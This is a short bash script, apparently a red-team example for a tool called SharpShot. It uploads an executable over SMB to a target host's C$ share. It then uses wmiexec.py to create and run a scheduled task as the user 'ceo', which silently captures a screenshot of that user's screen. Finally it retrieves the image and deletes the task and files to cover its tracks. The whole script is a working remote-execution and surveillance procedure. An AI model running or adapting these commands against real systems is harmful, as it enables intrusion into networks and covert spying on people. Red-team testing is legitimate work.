#!/bin/bash
#
# example for using SharpShot

# target
HOST="pc-boss.evilcorp.local"; USER="ceo"

# netbios domain name
DOMAIN="EVILCORP"

# tempdir for binary + screenshot png
TEMPDIR="/Users/${USER}/AppData/Local/Temp"
TEMPDIR2="C:`echo ${TEMPDIR} | tr '/' '\\\'`"

# upload binary
smbclient --kerberos //${HOST}/C$ -c "put SharpShot.exe ${TEMPDIR}/s.exe"

# create scheduled task
wmiexec.py -codec cp850 -k -no-pass ${HOST} "schtasks /create /sc DAILY /ru ${DOMAIN}\\${USER} /tn \"red_screenshot\" /tr \"${TEMPDIR2}\\s.exe ${TEMPDIR2}\\s.png\" /st 03:20 /f"

# run the task immediately
wmiexec.py -codec cp850 -k -no-pass ${HOST} 'schtasks /run /tn "red_screenshot"'

# cleanup: delete the task
wmiexec.py -codec cp850 -k -no-pass ${HOST} 'schtasks /delete /tn "red_screenshot" /f'

# download the screenshot + cleanup files
smbclient --kerberos //${HOST}/C$ -c "cd ${TEMPDIR}; get s.png screenshot_${HOST}_${USER}.png; rm s.png; rm s.exe"
